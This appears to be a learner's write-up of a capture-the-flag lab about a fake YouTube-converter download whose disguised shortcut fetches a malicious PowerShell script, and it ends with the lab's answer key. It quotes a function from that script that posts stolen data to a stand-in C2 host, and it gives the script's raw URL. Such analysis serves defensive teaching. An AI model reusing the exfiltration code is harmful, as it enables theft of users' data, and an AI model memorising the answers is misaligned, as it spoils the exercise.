Day 1 - Maybe SOC-mas music, he thought, doesn't come from a store?
Learning Objectives
Learn how to investigate malicious link files.
Learn about OPSEC and OPSEC mistakes.
Understand how to track and attribute digital identities in cyber investigations.

 It’s about a youtube converting website claiming to be safe. After investigating the website, get a youtube link to convert it. Download the zipfile and there’s 2 file after extraction. using the “file” command to check the file’s contents. song.mp3 looks okay but the somg.mp3 looks very suspicious, the output of states that it an “MS Windows shortcut”. So, investigate more with exifTool, and there you can see that this file, somg.mp3, is pulls file from remote server and saves it in the target directory. Next, go to the remote server, ‘https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1‘, to see it’s content, you should be able to see who created it and the command and control server(c2 server)”:

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

To investigate more, google dork it, remote server shows that it’s githubuser, and we a string from the it, 
Created by the one and only M.M. site:github.com
$c2Url = "http://papash3ll.thm/data" site:github.com

https://github.com/MM-WarevilleTHM/M.M
This will show who M.M. = Mayor Malware

There you have it, with all that information, you successfully completed the learning objectives.


Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? 
Answer: Tyler Ramsbey

The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?
Answer: http://papash3ll.thm/data

Who is M.M? Maybe his Github profile page would provide clues?
Answer: Mayor Malware

What is the number of commits on the GitHub repo where the issue was raised?
Answer: 1

===================================================

























